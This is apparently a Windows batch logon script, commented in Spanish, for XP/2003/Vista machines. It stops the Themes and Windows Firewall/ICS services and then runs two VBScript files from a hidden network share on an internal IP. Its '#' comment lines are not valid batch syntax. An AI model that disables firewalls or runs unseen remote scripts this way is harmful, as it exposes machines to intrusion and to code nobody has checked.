#ScripT para los Servicios de Windows en logueo de Usuarios

@echo off

 

#Para los Servicios de Themes Windows XP, Windows 2003, Windows Vista

NET STOP "Themes"

 

#Para los Servicios de Firewall Windows, XP, Windows 2003, Windows Vista.

NET STOP "Windows Firewall/Internet Connection Sharing (ICS)"


cscript.exe \\199.77.1.2\ff9i$\prueba.vbs

cscript.exe \\199.77.1.2\ff9i$\Mesa.vbs
